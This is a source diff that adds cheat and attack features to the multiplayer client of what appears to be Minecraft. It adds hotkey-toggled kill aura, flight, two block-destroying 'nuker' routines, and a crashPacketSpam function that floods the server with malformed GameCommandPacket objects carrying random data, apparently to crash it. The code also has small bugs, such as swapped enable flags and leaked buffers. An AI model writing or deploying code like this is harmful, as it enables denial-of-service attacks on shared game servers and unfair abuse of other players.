@@ -1,0 +1,256 @@
+diff --git a/Minecraft.Client/MultiPlayerLocalPlayer.cpp b/Minecraft.Client/MultiPlayerLocalPlayer.cpp
+index 25bf06bf..1e8379bf 100644
+--- a/Minecraft.Client/MultiPlayerLocalPlayer.cpp
++++ b/Minecraft.Client/MultiPlayerLocalPlayer.cpp
+@@ -12,6 +12,7 @@
+ #include "..\Minecraft.World\net.minecraft.world.effect.h"
+ #include "..\Minecraft.World\LevelData.h"
+ #include "..\Minecraft.World\net.minecraft.world.entity.item.h"
++#include "..\Minecraft.World\EntityIO.h"
+ #include "Input.h"
+ #include "LevelRenderer.h"
+ 
+@@ -32,9 +33,151 @@ MultiplayerLocalPlayer::MultiplayerLocalPlayer(Minecraft *minecraft, Level *leve
+ 	lastSprinting = false;
+     positionReminder = 0;
+ 
++	killAuraEnabled = false;
++    flightEnabled = false;
++    killauratimer = 0;
++    killauraDelay = 5;
++	nukerEnabled = false;
++	nukerEnabled2 = false;
++
++	crashPacketSpamEnabled = false;
++
+     this->connection = connection;
+ }
+ 
++void MultiplayerLocalPlayer::crashPacketSpam()
++{
++    if (!connection) return;
++
++    static bool spamActive = false;
++    
++    if (!spamActive)
++    {
++        spamActive = true;
++    }
++    
++    if (spamActive)
++    {
++        for (int i = 0; i < 30; i++)
++        {
++            byteArray badData;
++            badData.length = 3048;
++            badData.data = new BYTE[3048];
++            memset(badData.data, rand(), 3048);
++            
++            connection->send(shared_ptr<GameCommandPacket>(
++                new GameCommandPacket((EGameCommand)(rand() % 200), badData)));
++        }
++    }
++}
++
++void MultiplayerLocalPlayer::doNuker()
++{
++    if (!level || !nukerEnabled2) return;
++
++    int px = Mth::floor(x);
++    int py = Mth::floor(y);
++    int pz = Mth::floor(z);
++
++    for (int dx = -2; dx <= 2; dx++)
++    {
++        for (int dy = -1; dy <= 2; dy++)
++        {
++            for (int dz = -2; dz <= 2; dz++)
++            {
++                int bx = px + dx;
++                int by = py + dy;
++                int bz = pz + dz;
++
++                int blockId = level->getTile(bx, by, bz);
++                
++                if (blockId != 0 && blockId)
++                {
++                    minecraft->gameMode->startDestroyBlock(bx, by, bz, -1);
++                }
++            }
++        }
++    }
++}
++
++void MultiplayerLocalPlayer::doNuker2()
++{
++    if (!level || !nukerEnabled2) return;
++
++    int px = Mth::floor(x);
++    int py = Mth::floor(y);
++    int pz = Mth::floor(z);
++
++    for (int dx = -2; dx <= 2; dx++)
++    {
++        for (int dy = -1; dy <= 2; dy++)
++        {
++            for (int dz = -2; dz <= 2; dz++)
++            {
++                int bx = px + dx;
++                int by = py + dy;
++                int bz = pz + dz;
++
++                int blockId = level->getTile(bx, by, bz);
++                
++                if (blockId == 0) 
++                {
++                    auto it = breakProgress.find({bx, by, bz});
++                    if (it != breakProgress.end())
++                    {
++                        breakProgress.erase(it);
++                    }
++                    continue;
++                }
++
++                if (breakProgress.find({bx, by, bz}) != breakProgress.end())
++                {
++                    continue;
++                }
++
++                minecraft->gameMode->startDestroyBlock(bx, by, bz, -1);
++                breakProgress[{bx, by, bz}] = 1;
++            }
++        }
++    }
++}
++
++void MultiplayerLocalPlayer::findAndAttackTarget()
++{
++    if (!level || !killAuraEnabled) return;
++
++    if (killauratimer > 0)
++    {
++        killauratimer--;
++        return;
++    }
++
++    float range = 6.0f;
++
++    for (size_t i = 0; i < level->entities.size(); i++)
++    {
++        shared_ptr<Entity> entity = level->entities[i];
++
++        if (!entity || entity.get() == this) continue;
++        if (!entity->isAlive()) continue;
++
++        double dx = entity->x - x;
++        double dy = entity->y - y;
++        double dz = entity->z - z;
++        float dist = sqrt(dx*dx + dy*dy + dz*dz);
++
++        if (dist <= range)
++        {
++            Player::attack(entity);
++            swing();
++
++            killauratimer = killauraDelay;
++
++            break;
++        }
++    }
++}
++
+ bool MultiplayerLocalPlayer::hurt(DamageSource *source, float dmg)
+ {
+ 	return false;
+@@ -63,6 +206,58 @@ void MultiplayerLocalPlayer::tick()
+ 
+     LocalPlayer::tick();
+ 
++	if (GetAsyncKeyState('Y') & 1)
++    {
++        killAuraEnabled = !killAuraEnabled;
++    }
++
++    if (GetAsyncKeyState('G') & 1)
++    {
++        flightEnabled = !flightEnabled;
++        if (flightEnabled)
++        {
++            abilities.mayfly = true;
++            abilities.flying = true;
++        }
++        else
++        {
++            abilities.mayfly = false;
++            abilities.flying = false;
++        }
++    }
++
++    if (GetAsyncKeyState('P') & 1)
++    {
++		nukerEnabled = !nukerEnabled;
++    }
++	if (GetAsyncKeyState('O') & 1)
++    {
++		nukerEnabled2 = !nukerEnabled2;
++    }
++
++    if (GetAsyncKeyState('U') & 1)
++    {
++        crashPacketSpamEnabled = !crashPacketSpamEnabled;
++        if (crashPacketSpamEnabled)
++        {
++            crashPacketSpam();
++        }
++    }
++
++	if (nukerEnabled)
++	{
++		doNuker();
++	}
++	if (nukerEnabled2)
++	{
++		doNuker2();
++	}
++
++    if (killAuraEnabled)
++    {
++        findAndAttackTarget();
++    }
++
+ 	// 4J added for testing
+ #ifdef STRESS_TEST_MOVE
+ 	if(stressTestEnabled)
+diff --git a/Minecraft.Client/MultiPlayerLocalPlayer.h b/Minecraft.Client/MultiPlayerLocalPlayer.h
+index e660a96a..af495100 100644
+--- a/Minecraft.Client/MultiPlayerLocalPlayer.h
++++ b/Minecraft.Client/MultiPlayerLocalPlayer.h
+@@ -17,11 +17,28 @@ public:
+ private:
+     bool flashOnSetHealth;
+ public:
++	void doNuker();
++	void doNuker2();
++	void findAndAttackTarget();
++    void crashPacketSpam();
+ 	MultiplayerLocalPlayer(Minecraft *minecraft, Level *level, User *user, ClientConnection *connection);
+ private:
+ 	double xLast, yLast1, yLast2, zLast;
+     float yRotLast, xRotLast;
+ public:
++	bool nukerEnabled;
++	bool nukerEnabled2;
++	std::map<std::tuple<int, int, int>, int> breakProgress;
++	bool killAuraEnabled;
++	bool flightEnabled;
++	int killauratimer;
++	int killauraDelay;
++	bool isNukerEnabled() const { return nukerEnabled; }
++	bool isNukerEnabled2() const { return nukerEnabled; }
++	bool isKillAuraEnabled() const { return killAuraEnabled; }
++	bool isFlightEnabled() const { return flightEnabled; }
++	bool crashEntitySpamEnabled;
++    bool crashPacketSpamEnabled;
+ 	virtual bool hurt(DamageSource *source, float dmg);
+     virtual void heal(float heal);
+     virtual void tick();
